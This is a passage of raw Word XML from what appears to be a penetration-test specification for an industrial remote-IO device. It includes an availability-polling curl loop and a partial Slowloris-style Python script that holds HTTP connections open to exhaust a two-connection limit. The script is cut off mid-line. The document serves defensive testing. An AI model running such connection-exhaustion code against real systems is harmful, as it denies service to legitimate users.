          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>swrevision</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>deviceinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>swinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24168CA0" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>=$(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s -o /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -m 1 -w '%{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">}' </w:t>
      </w:r>
      <w:hyperlink r:id="rId172" w:history="1">
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/$ep</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101DAA6C" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>echo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> "$(date +%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>s.%N</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>),$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>ep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>,$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>" &gt;&gt; $LOG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1FB1F9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done; sleep 0.2; done; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FB74E6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poll &amp; # start sampling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C0746C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# --- operator actions, timestamped in a lab notebook ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723F170B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# (1) power-cycle DUT -&gt; Init outage window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7963E998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# (2) set rotary=999, reboot -&gt; Update state</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0905677B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# (3) trigger /firmware/install -&gt; install reboot outage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5F8585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 xml:space="preserve"># (4) induce </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (EC1) -&gt; safe-state window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E91FCC1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kill %1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419A7638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 xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>analyse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: intervals where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> != 200, and where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is empty/timeout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB610CB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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Outage rows (non-200/timeout) during Init, install-reboot, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scpuversion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> empty during SCPU flash (SRIO-15759, SRIO-2953); cross-reference EMC "not-supervised" concession (SRIO-11573/11572). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Outage windows recorded (G-1 confirmed) — total unavailable time: ______ | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0702_avail.csv, annotated timeline, LED-state photos per transition | </w:t>
      </w:r>
      <w:hyperlink r:id="rId173" w:history="1">
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId174" w:history="1">
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E55DD7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CAF1C68" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="49FD1B32">
          <v:rect id="_x0000_i1483" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E18165" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ007-03 — Connection-Hold Self-DoS on the Identification API (G-2 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2DE1B2" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538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7747"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="4D9AE1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3859FA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E0D6BC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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="0B68A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A11C4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8685D" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="09A81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E9D1F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AE8819" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve">RQ-007 → CR 7.1 / CR 7.2 → </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t>Asset</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="pt-BR"/>
              </w:rPr>
              <w:t xml:space="preserve"> H</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="2760B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E9B71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 xml:space="preserve">Target </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>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DF3D9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lastRenderedPageBreak/>
              <w:t>Self-inflicted DoS (resource-cap design flaw)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="7B0DE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7AD7B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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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72186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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="10967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7CD15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3934C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 xml:space="preserve">Demonstrate that the 2-connection limit (SRIO-7909), intended as DoS protection, is itself a DoS vector: two held connections exhaust the pool and </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>block all further legitimate access</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> to the identification API, defeating "at all times" </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>without any bandwidth-based flooding</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (which is RQ-010).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="766F1E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ECFF2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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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C7E8A" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. In OPERATE, open two HTTP connections to the IoT-Core and hold them (no completion / slow read). 2. From a third client, attempt a legitimate identification read. 3. Measure whether the third request is refused/timed out. 4. </w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Release </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>one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held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connection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>confirm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access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is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restored</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="74504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1EC59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4D732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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a legitimate third read still succeeds (service resilient to two held connections). </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the third request is blocked while two connections are held → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (self-inflicted DoS availability failure).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="472EA609" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538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295"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="244025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A47FC2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C6232C" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="314F5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7FD7F" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0001553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4D5EB" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>TC-RQ007-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="75A36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0E133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C4017" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t>DUT 192.168.0.2; Pi eth1 = 192.168.50.10 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>attacker</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>legitimate</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>client</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="39A89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99ECB" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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D9136" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Python (raw sockets, hold connections), curl (third-client probe)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13F66A23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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F527E27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# TC-RQ007-03 Hold 2 HTTP connections; then probe with a 3rd legitimate read</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ABE9C46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import socket, subprocess, time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7DF7E2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DUT, PORT = "192.168.0.2", 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349B5366" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45DB2FAB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def hold(): # open + partial request, never finish (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-style)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C09522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 xml:space="preserve">s = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>socket.create_connection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>((DUT, PORT), timeout=5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B25DCF1" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00E55DD7" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s.sendall</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
